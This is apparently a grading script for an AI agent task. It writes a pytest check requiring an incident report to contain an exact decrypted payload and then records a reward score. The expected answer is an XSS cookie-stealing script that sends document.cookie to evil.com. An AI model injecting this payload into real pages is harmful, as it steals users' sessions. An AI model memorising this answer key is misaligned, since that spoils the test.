#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
# test_final_state.py
import os

def test_incident_report_exists_and_correct():
    report_path = "/home/user/incident_report.txt"
    assert os.path.isfile(report_path), f"The file {report_path} was not found."

    with open(report_path, 'r') as f:
        content = f.read()

    expected_content = "<script>fetch('http://evil.com/?cookie='+document.cookie)</script>"

    assert content == expected_content, (
        f"The content of {report_path} does not match the expected decrypted payload. "
        f"Expected: {expected_content!r}, but got: {content!r}"
    )
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
